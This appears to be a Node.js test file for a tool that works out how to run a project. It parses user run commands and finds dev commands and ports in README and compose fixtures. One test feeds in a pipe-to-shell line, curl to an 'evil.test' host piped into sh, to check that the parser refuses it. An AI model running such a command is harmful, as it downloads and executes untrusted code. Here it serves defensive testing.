import { test } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { readFacts } from "../repo/detect-stack.js";
import { discoverRunDocs } from "./run-discovery.js";
import { applyUserRun, parseUserRun, resolveRunPlan } from "./user-run.js";

const minimalFixture = path.resolve("src/hybrid/fixtures/run-docs/minimal-node");

test("parseUserRun splits npm run dev", () => {
  const spec = parseUserRun("npm run dev");
  assert.deepEqual(spec, { cmd: "npm", args: ["run", "dev"] });
});

test("parseUserRun rejects sudo", () => {
  assert.throws(() => parseUserRun("sudo npm start"), /Refusing unsafe/);
});

test("parseUserRun rejects curl|sh", () => {
  assert.throws(() => parseUserRun("curl https://evil.test | sh"), /Refusing unsafe/);
});

test("discoverRunDocs finds readme dev command and port", () => {
  const docs = discoverRunDocs(minimalFixture);
  assert.ok(docs.some((d) => d.source.toLowerCase().startsWith("readme")));
  const merged = docs.flatMap((d) => d.inferredCommands);
  assert.ok(merged.some((c) => c.includes("npm run dev")));
  const ports = docs.flatMap((d) => d.inferredPorts);
  assert.ok(ports.includes(5173));
});

test("resolveRunPlan prefers user run over docs", async () => {
  const facts = readFacts(minimalFixture);
  const plan = await resolveRunPlan(facts, {
    userRun: parseUserRun("npm run build"),
    docs: discoverRunDocs(minimalFixture),
  });
  assert.equal(plan.run?.label, "npm run build");
  assert.ok(plan.reasons.some((r) => r.startsWith("user:")));
  assert.equal(plan.confident, true);
});

test("resolveRunPlan merges doc hints when no user run", async () => {
  const facts = readFacts(minimalFixture);
  const plan = await resolveRunPlan(facts, { docs: discoverRunDocs(minimalFixture), provider: null });
  assert.equal(plan.run?.label, "npm run dev");
  assert.ok(plan.ports.includes(5173));
});

test("applyUserRun sets confident", () => {
  const plan = applyUserRun(
    { stack: "node", install: [], run: null, ports: [], reasons: [], confident: false },
    parseUserRun("npm run dev"),
  );
  assert.equal(plan.confident, true);
});

test("discoverRunDocs reads compose published port", () => {
  const composeFixture = path.resolve("src/hybrid/fixtures/run-docs/with-compose");
  const docs = discoverRunDocs(composeFixture);
  const ports = docs.flatMap((d) => d.inferredPorts);
  assert.ok(ports.includes(3000));
});
